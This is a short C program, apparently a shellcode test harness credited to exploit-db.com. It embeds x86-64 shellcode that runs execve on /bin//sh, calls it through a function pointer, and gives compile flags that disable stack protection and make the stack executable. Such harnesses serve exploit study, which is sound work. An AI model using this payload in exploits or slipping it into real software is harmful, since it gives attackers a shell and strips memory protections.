#include<stdio.h>
#include<string.h>

// WARNING: NOT VERIFIED SO DON'T RUN! - Taken from exploit-db.com
// compile with:
//				gcc -fno-stack-protector -z execstack shellcode2.c -o shellcode

unsigned char shellcode[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";


int main(int argc, char** argv) {
		printf("length of shellcode is: %d\n", (int)strlen(shellcode));

		int (*ret)() = (int(*)())shellcode;
		ret();

		return 0;
}

